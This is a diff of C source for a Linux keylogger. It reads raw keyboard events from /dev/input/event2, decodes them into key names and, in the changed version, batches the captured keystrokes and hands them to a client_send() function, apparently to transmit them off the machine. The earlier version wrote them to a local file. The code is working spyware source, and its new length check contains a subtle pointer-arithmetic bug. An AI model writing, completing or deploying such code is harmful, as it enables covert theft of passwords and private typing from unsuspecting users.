@@ -9,13 +9,11 @@
 #include <linux/input.h>
 #include "keylog.h"
 
-#define EVENT_NUM 100
-#define TOT_KEYS 70
 
 char *keys[] = {
   "[KEY_RESERVED]",
   "[KEY_ESC]",
-  "[KEY_1i]",
+  "[KEY_1]",
   "[KEY_2]",
   "[KEY_3]",
   "[KEY_4]",
@@ -92,56 +90,39 @@ void safebreak(){
 
 void main()
 {
-  int count = 0;
-  int dif;
-  // open output text file to store decoded keystrokes
-  FILE *output;
-  char message[128];
-  output = fopen("output.txt", "w+");
+	char message[SIZEOF_MESSAGE];
 
-  //open the eventX file that records keystrokes
-  //char keyboardPath_EVENTUALLYREPLACE[] = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
-  char keyboardPath_EVENTUALLYREPLACE[] = "/dev/input/event2";
-  int device = open(keyboardPath_EVENTUALLYREPLACE, O_RDONLY);
-  struct input_event inpEvent;
+	//open the eventX file that records keystrokes
+	//char keyboardPath_EVENTUALLYREPLACE[] = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
+	char keyboardPath_EVENTUALLYREPLACE[] = "/dev/input/event2";
+	int device = open(keyboardPath_EVENTUALLYREPLACE, O_RDONLY);
+	struct input_event inpEvent;
 
-  // safely break from loop when Ctrl-C is pressed
-  signal(SIGINT, safebreak);
+	// safely break from loop when Ctrl-C is pressed
+	signal(SIGINT, safebreak);
 
-  while(1)
-  {
-    usleep(1000);
-    read(device, &inpEvent, sizeof(inpEvent));  
-    //if the type of the event is a state change (like of a keyboard)
-    if (inpEvent.type == 1 && inpEvent.value == 1)
-    {
-      //if the event code indicates a standard keyboard button
-      if (inpEvent.code > 0 && inpEvent.code <= TOT_KEYS)
-      {
-	if (strlen(message) + strlen(keys[inpEvent.code]) < 128) 
+	while(1)
 	{
-	  strcat(message, keys[inpEvent.code]);
-          strcat(message, " ");
+		usleep(1000);
+		read(device, &inpEvent, sizeof(inpEvent));  
+		//if the type of the event is a state change (like of a keyboard)
+		if (inpEvent.type == 1 && inpEvent.value == 1)
+		{
+			//if the event code indicates a standard keyboard button
+			if (inpEvent.code > 0 && inpEvent.code <= TOT_KEYS)
+			{
+				if (strlen(message) + strlen(keys[inpEvent.code] + 1) < SIZEOF_MESSAGE) 
+				{
+					strcat(message, keys[inpEvent.code]);
+					strcat(message, " ");
+				}
+				else 
+				{
+					client_send(message);
+					strcpy(message, "");
+					strcat(message, keys[inpEvent.code]);
+				}
+			}
+		}
 	}
-	else 
-	{
-	  dif = (strlen(message) + strlen(keys[inpEvent.code])) - 128;
-	  strncat(message, keys[inpEvent.code], dif);
- 	  client_send(message);
-	  strcpy(message, "");
-	  strcat(message, keys[inpEvent.code] + dif);
-	}
-
-        //output the code of the standard keyboard button
-        fprintf(output, "%s\n", keys[inpEvent.code]);
-        count++;
-      }
-      else
-      {
-        fprintf(output, "Key not recognized\n");
-        count++;
-      }
-    }
-  }
-  fclose(output);
 }
